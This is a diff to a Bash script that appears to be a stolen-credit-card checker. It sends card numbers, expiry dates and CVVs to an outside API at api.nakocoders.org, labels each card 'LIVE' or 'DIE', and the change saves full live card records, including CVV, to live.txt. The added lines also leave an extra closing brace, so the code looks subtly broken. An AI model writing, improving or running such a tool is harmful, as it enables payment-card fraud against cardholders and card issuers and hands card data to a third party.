@@ -34,12 +34,16 @@ tatsumi(){
     curlnya=$(curl -s "http://api.nakocoders.org/index.php?num=$1&bulan=$2&tahun=$3&ccvna=$4" -L)
     livena=$(echo $curlnya | grep -Po '(?<="code":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
     if [[ ! $livena =~ "card_declined" ]]; then
-        printf "${HIJAU}[LIVE] $1 [$waktu]\n";
+        printf "\n$1|$2|$3|$4 ${HIJAU}[LIVE] [$bincc/$scheme1-$typena1] [$waktu]\n";
+        echo "$1|$2|$3|$4 [LIVE] [$bincc/$scheme1-$typena1] [$waktu]" >> live.txt
         printf "${NORMAL}"
     else
-        printf "${RED}[DIE] $1 [$waktu]\n";
+        printf "$1|$2|$3|$4 ${MERAH}[DIE] [$bincc/$scheme1-$typena1] [$waktu]";
+        echo ""
         printf "${NORMAL}"
     fi
+}
+
 }
 header
 echo ""
